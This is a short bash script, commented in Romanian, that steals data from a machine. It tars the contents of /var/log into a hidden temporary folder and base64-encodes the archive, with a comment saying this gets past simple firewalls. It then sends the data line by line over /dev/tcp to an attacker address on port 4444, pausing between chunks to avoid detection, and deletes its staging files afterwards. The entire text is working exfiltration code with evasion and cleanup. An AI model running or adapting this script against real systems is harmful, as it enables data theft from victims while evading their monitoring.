#!/bin/bash
ATTACKER_IP="192.168.12.5"
PORT="4444"
TARGET_DIR="/var/log"  # Colectăm log-urile victimei ca date furate
STAGING="/tmp/.exfil_stage"

mkdir -p $STAGING

echo "[*] Staging data from $TARGET_DIR..."
# Arhivăm datele
tar -czf $STAGING/data.tar.gz $TARGET_DIR 2>/dev/null

echo "[*] Encoding and Chunking data..."
# Codăm base64 pentru a trece de firewall-uri simple și spargem în linii
base64 $STAGING/data.tar.gz > $STAGING/data.b64

# Citim fișierul linie cu linie și îl trimitem lent
total_lines=$(wc -l < $STAGING/data.b64)
current=0

while IFS= read -r line; do
    ((current++))
    # Trimite linia către atacator
    bash -c "echo '$line' > /dev/tcp/$ATTACKER_IP/$PORT" 2>/dev/null
    
    # Afișăm progres
    echo -ne "Exfiltrating: $current / $total_lines chunks\r"
    
    # Așteaptă puțin între pachete (Low & Slow)
    sleep 0.5 
done < "$STAGING/data.b64"

echo -e "\n[*] Exfiltration complete. Cleaning up..."
rm -rf $STAGING
